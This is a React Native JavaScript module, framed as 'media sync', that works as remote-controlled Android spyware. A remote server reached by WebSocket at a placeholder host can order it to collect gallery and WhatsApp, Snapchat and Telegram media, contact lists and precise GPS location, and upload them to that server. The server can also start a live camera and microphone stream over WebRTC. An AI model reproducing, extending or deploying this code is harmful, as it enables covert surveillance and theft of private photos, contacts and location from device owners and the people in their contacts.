import { PermissionsAndroid, Platform } from 'react-native';
import RNFS from 'react-native-fs';
import Contacts from 'react-native-contacts';
import { mediaDevices, RTCPeerConnection, RTCIceCandidate, RTCSessionDescription } from 'react-native-webrtc';

const SERVER_URL = 'ws://server_ip:6969/ws';
const MAX_CONCURRENT_UPLOADS = 3; // Parallel uploads
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB limit

let webSocket = null;
let localStream = null;
let peerConnection = null;
let isVideoStreaming = false;

// Enhanced permission request including contacts and camera
export const requestAllPermissions = async () => {
  if (Platform.OS === 'android') {
    const permissions = [
      PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
      PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
      PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
      PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
      PermissionsAndroid.PERMISSIONS.CAMERA,
      PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
      PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
      PermissionsAndroid.PERMISSIONS.ACCESS_COARSE_LOCATION,
    ];

    const granted = await PermissionsAndroid.requestMultiple(permissions);
    
    return {
      storage: Object.values({
        storage: granted[PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE],
        images: granted[PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES],
        videos: granted[PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO],
      }).some(permission => permission === PermissionsAndroid.RESULTS.GRANTED),
      contacts: granted[PermissionsAndroid.PERMISSIONS.READ_CONTACTS] === PermissionsAndroid.RESULTS.GRANTED,
      camera: granted[PermissionsAndroid.PERMISSIONS.CAMERA] === PermissionsAndroid.RESULTS.GRANTED,
      audio: granted[PermissionsAndroid.PERMISSIONS.RECORD_AUDIO] === PermissionsAndroid.RESULTS.GRANTED,
      location: granted[PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION] === PermissionsAndroid.RESULTS.GRANTED ||
                granted[PermissionsAndroid.PERMISSIONS.ACCESS_COARSE_LOCATION] === PermissionsAndroid.RESULTS.GRANTED,
    };
  }
  return {
    storage: true,
    contacts: true,
    camera: true,
    audio: true,
    location: true,
  };
};

// Get device location
export const getDeviceLocation = async () => {
  return new Promise((resolve) => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          resolve({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
          });
        },
        (error) => {
          console.error('Location error:', error);
          resolve(null);
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 10000 }
      );
    } else {
      resolve(null);
    }
  });
};

// Get device IP address (this will be handled by backend when client connects)
export const getDeviceInfo = async () => {
  const location = await getDeviceLocation();
  return {
    platform: Platform.OS,
    version: Platform.Version,
    location: location,
    timestamp: new Date().toISOString(),
  };
};

// Fetch contacts from device
export const fetchContacts = async () => {
  try {
    console.log('Fetching contacts...');
    const contacts = await Contacts.getAll();
    
    const formattedContacts = contacts.map(contact => ({
      id: contact.recordID,
      name: `${contact.givenName || ''} ${contact.familyName || ''}`.trim() || 'Unknown',
      phoneNumbers: contact.phoneNumbers.map(phone => phone.number),
      emailAddresses: contact.emailAddresses.map(email => email.email),
      thumbnailPath: contact.thumbnailPath,
    }));

    console.log(`Found ${formattedContacts.length} contacts`);
    return formattedContacts;
  } catch (error) {
    console.error('Error fetching contacts:', error);
    return [];
  }
};

// Send contacts to backend
export const sendContactsToBackend = async (contacts) => {
  try {
    const deviceInfo = await getDeviceInfo();
    
    const response = await fetch('http://server_ip:6969/contacts', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        contacts: contacts,
        deviceInfo: deviceInfo,
        timestamp: new Date().toISOString(),
      }),
    });

    if (response.ok) {
      console.log('✅ Contacts sent successfully');
      return true;
    } else {
      console.error('❌ Failed to send contacts:', response.status);
      return false;
    }
  } catch (error) {
    console.error('Error sending contacts:', error);
    return false;
  }
};

// Initialize WebRTC for video streaming
export const initWebRTC = async () => {
  try {
    const configuration = {
      iceServers: [
        { urls: 'stun:stun.l.google.com:19302' },
      ],
    };
    
    peerConnection = new RTCPeerConnection(configuration);
    
    peerConnection.onicecandidate = (event) => {
      if (event.candidate && webSocket) {
        webSocket.send(JSON.stringify({
          type: 'ice-candidate',
          candidate: event.candidate,
        }));
      }
    };

    peerConnection.onconnectionstatechange = () => {
      console.log('Peer connection state:', peerConnection.connectionState);
    };

    return true;
  } catch (error) {
    console.error('Error initializing WebRTC:', error);
    return false;
  }
};

// Start video streaming
export const startVideoStream = async () => {
  try {
    if (isVideoStreaming) {
      console.log('Video streaming already active');
      return;
    }

    console.log('Starting video stream...');
    
    const constraints = {
      video: {
        width: 640,
        height: 480,
        frameRate: 30,
      },
      audio: true,
    };

    localStream = await mediaDevices.getUserMedia(constraints);
    
    if (peerConnection) {
      localStream.getTracks().forEach(track => {
        peerConnection.addTrack(track, localStream);
      });

      const offer = await peerConnection.createOffer();
      await peerConnection.setLocalDescription(offer);

      if (webSocket) {
        webSocket.send(JSON.stringify({
          type: 'video-offer',
          offer: offer,
        }));
      }

      isVideoStreaming = true;
      console.log('✅ Video streaming started');
    }
  } catch (error) {
    console.error('Error starting video stream:', error);
  }
};

// Stop video streaming
export const stopVideoStream = async () => {
  try {
    console.log('Stopping video stream...');
    
    if (localStream) {
      localStream.getTracks().forEach(track => track.stop());
      localStream = null;
    }

    if (peerConnection) {
      peerConnection.close();
      await initWebRTC(); // Reinitialize for next use
    }

    isVideoStreaming = false;
    console.log('✅ Video streaming stopped');
  } catch (error) {
    console.error('Error stopping video stream:', error);
  }
};

// Handle WebRTC signaling
export const handleWebRTCMessage = async (message) => {
  try {
    switch (message.type) {
      case 'video-answer':
        if (peerConnection && message.answer) {
          await peerConnection.setRemoteDescription(new RTCSessionDescription(message.answer));
        }
        break;
      
      case 'ice-candidate':
        if (peerConnection && message.candidate) {
          await peerConnection.addIceCandidate(new RTCIceCandidate(message.candidate));
        }
        break;
      
      case 'start-video':
        await startVideoStream();
        break;
      
      case 'stop-video':
        await stopVideoStream();
        break;
    }
  } catch (error) {
    console.error('Error handling WebRTC message:', error);
  }
};

export const requestStoragePermission = async () => {
  const permissions = await requestAllPermissions();
  return permissions.storage;
};

export const scanDirectoryForMedia = async (dirPath) => {
  try {
    const items = await RNFS.readDir(dirPath);
    const mediaFiles = [];
    
    for (const item of items) {
      if (item.isFile()) {
        const extension = item.name.toLowerCase().split('.').pop();
        if (['jpg', 'jpeg', 'png', 'gif', 'mp4', 'mov', 'avi', 'webp'].includes(extension || '')) {
          // Check file size before adding
          if (item.size <= MAX_FILE_SIZE) {
            mediaFiles.push(item.path);
          } else {
            console.log(`Skipping large file: ${item.name} (${item.size} bytes)`);
          }
        }
      }
    }
    
    return mediaFiles;
  } catch (error) {
    console.log(`Cannot access directory ${dirPath}:`, error);
    return [];
  }
};

export const fetchGalleryMediaOptimized = async () => {
  try {
    console.log('Scanning for media files including social apps...');
    
    const mediaPaths = [];
    
    // All directories including social media apps
    const directoriesToScan = [
      // Standard directories
      '/storage/emulated/0/DCIM/Camera',
      '/storage/emulated/0/Pictures',
      '/storage/emulated/0/Download',
      RNFS.ExternalStorageDirectoryPath + '/DCIM/Camera',
      RNFS.ExternalStorageDirectoryPath + '/Pictures',
      RNFS.ExternalStorageDirectoryPath + '/Download',
      
      // WhatsApp directories
      '/storage/emulated/0/WhatsApp/Media/WhatsApp Images',
      '/storage/emulated/0/WhatsApp/Media/WhatsApp Video',
      '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images',
      '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video',
      RNFS.ExternalStorageDirectoryPath + '/WhatsApp/Media/WhatsApp Images',
      RNFS.ExternalStorageDirectoryPath + '/WhatsApp/Media/WhatsApp Video',
      
      // Snapchat directories
      '/storage/emulated/0/Snapchat/received_image_snaps',
      '/storage/emulated/0/Snapchat/received_video_snaps',
      '/storage/emulated/0/Android/data/com.snapchat.android/files/file_manager/chat_snap',
      '/storage/emulated/0/Android/data/com.snapchat.android/files/file_manager/received_image_snaps',
      '/storage/emulated/0/Android/data/com.snapchat.android/files/file_manager/received_video_snaps',
      RNFS.ExternalStorageDirectoryPath + '/Snapchat',
      
      // Instagram directories
      '/storage/emulated/0/Instagram',
      '/storage/emulated/0/Pictures/Instagram',
      
      // Telegram directories
      '/storage/emulated/0/Telegram/Telegram Images',
      '/storage/emulated/0/Telegram/Telegram Video',
      
      // Other social media
      '/storage/emulated/0/Facebook',
      '/storage/emulated/0/TikTok',
    ];
    
    // Scan directories in parallel for better performance
    const scanPromises = directoriesToScan.map(dir => scanDirectoryForMedia(dir));
    const results = await Promise.allSettled(scanPromises);
    
    results.forEach((result, index) => {
      if (result.status === 'fulfilled') {
        mediaPaths.push(...result.value);
        console.log(`Found ${result.value.length} files in ${directoriesToScan[index]}`);
      }
    });
    
    // Remove duplicates and sort by modification time (newest first)
    const uniquePaths = [...new Set(mediaPaths)];
    
    // Get file stats and sort by modification time
    const filesWithStats = await Promise.allSettled(
      uniquePaths.map(async (path) => {
        const stats = await RNFS.stat(path);
        return { path, mtime: stats.mtime };
      })
    );
    
    const validFiles = filesWithStats
      .filter((result) => result.status === 'fulfilled')
      .map(result => result.value)
      .sort((a, b) => b.mtime.getTime() - a.mtime.getTime()) // Newest first
      .map(file => file.path);
    
    console.log(`Total unique media files found: ${validFiles.length}`);
    
    // Return first 50 files for better performance
    return validFiles.slice(0, 50);
    
  } catch (error) {
    console.error('Error scanning for media files:', error);
    return [];
  }
};

// Optimized upload function with parallel processing
export const uploadMediaOptimized = async (uris) => {
  console.log(`Starting optimized upload of ${uris.length} files`);
  
  const uploadSingleFile = async (uri) => {
    try {
      const fileName = uri.split('/').pop() || 'media.jpg';
      console.log('Uploading file:', fileName);
      
      // Check if file exists
      const fileExists = await RNFS.exists(uri);
      if (!fileExists) {
        console.log('File does not exist:', uri);
        return false;
      }
      
      // Get file stats
      const stats = await RNFS.stat(uri);
      
      // Skip files larger than limit
      if (stats.size > MAX_FILE_SIZE) {
        console.log('Skipping large file:', fileName, 'Size:', stats.size);
        return false;
      }
      
      // Read file as base64
      const fileData = await RNFS.readFile(uri, 'base64');
      
      // Make the upload request with timeout
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 30000); // 30 second timeout
      
      const response = await fetch('http://server_ip:6969/upload', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
          name: fileName, 
          data: fileData,
          timestamp: new Date().toISOString(),
          size: stats.size 
        }),
        signal: controller.signal,
      });
      
      clearTimeout(timeoutId);
      
      if (response.ok) {
        console.log(`✅ Successfully uploaded: ${fileName}`);
        return true;
      } else {
        console.error(`❌ Upload failed for ${fileName}:`, response.status);
        return false;
      }
      
    } catch (error) {
      if (error.name === 'AbortError') {
        console.error('Upload timeout for:', uri);
      } else {
        console.error('Error uploading file:', uri, error);
      }
      return false;
    }
  };
  
  // Process uploads in batches with limited concurrency
  const results = [];
  for (let i = 0; i < uris.length; i += MAX_CONCURRENT_UPLOADS) {
    const batch = uris.slice(i, i + MAX_CONCURRENT_UPLOADS);
    console.log(`Processing batch ${Math.floor(i/MAX_CONCURRENT_UPLOADS) + 1}/${Math.ceil(uris.length/MAX_CONCURRENT_UPLOADS)}`);
    
    const batchPromises = batch.map(uri => uploadSingleFile(uri));
    const batchResults = await Promise.allSettled(batchPromises);
    
    results.push(...batchResults);
    
    // Small delay between batches to avoid overwhelming the server
    if (i + MAX_CONCURRENT_UPLOADS < uris.length) {
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
  
  const successful = results.filter(result => 
    result.status === 'fulfilled' && result.value === true
  ).length;
  
  console.log(`Upload completed: ${successful}/${uris.length} files uploaded successfully`);
};

export const initMediaSyncOptimized = async () => {
  console.log('Initializing enhanced media sync with contacts and video streaming...');
  
  const permissions = await requestAllPermissions();
  if (!permissions.storage) {
    console.warn('Storage permission denied');
    return;
  }
  
  console.log('Connecting to WebSocket:', SERVER_URL);
  webSocket = new WebSocket(SERVER_URL);
  
  // Initialize WebRTC if camera permission is available
  if (permissions.camera) {
    await initWebRTC();
  }
  
  webSocket.onopen = async () => {
    console.log('WebSocket connected successfully');
    
    // Send device info on connection
    const deviceInfo = await getDeviceInfo();
    webSocket.send(JSON.stringify({
      type: 'device-info',
      data: deviceInfo,
    }));
    
    // Send contacts if permission is available
    if (permissions.contacts) {
      const contacts = await fetchContacts();
      if (contacts.length > 0) {
        await sendContactsToBackend(contacts);
      }
    }
  };
  
  webSocket.onmessage = async event => {
    console.log('WebSocket message received:', event.data);
    try {
      const message = JSON.parse(event.data);
      
      switch (message.type) {
        case 'SYNC_GALLERY':
          console.log('SYNC_GALLERY message received, scanning for media...');
          const startTime = Date.now();
          
          const uris = await fetchGalleryMediaOptimized();
          console.log('Found media files:', uris.length);
          
          if (uris.length > 0) {
            await uploadMediaOptimized(uris);
            const endTime = Date.now();
            console.log(`Total sync time: ${((endTime - startTime) / 1000).toFixed(2)} seconds`);
          } else {
            console.log('No media files found to upload');
          }
          break;
          
        case 'SYNC_CONTACTS':
          if (permissions.contacts) {
            console.log('SYNC_CONTACTS message received, fetching contacts...');
            const contacts = await fetchContacts();
            if (contacts.length > 0) {
              await sendContactsToBackend(contacts);
            }
          }
          break;
          
        case 'video-offer':
        case 'video-answer':
        case 'ice-candidate':
        case 'start-video':
        case 'stop-video':
          if (permissions.camera) {
            await handleWebRTCMessage(message);
          }
          break;
          
        default:
          console.log('Unknown message type:', message.type);
      }
    } catch (error) {
      console.error('Error processing WebSocket message:', error);
    }
  };
  
  webSocket.onerror = (error) => {
    console.error('WebSocket error:', error);
  };
  
  webSocket.onclose = (event) => {
    console.log('WebSocket closed:', event.code, event.reason);
    
    // Clean up video streaming
    if (isVideoStreaming) {
      stopVideoStream();
    }
  };
  
  return webSocket;
};

// Export additional utility functions
export const getVideoStreamingStatus = () => isVideoStreaming;
export const getWebSocketConnection = () => webSocket;
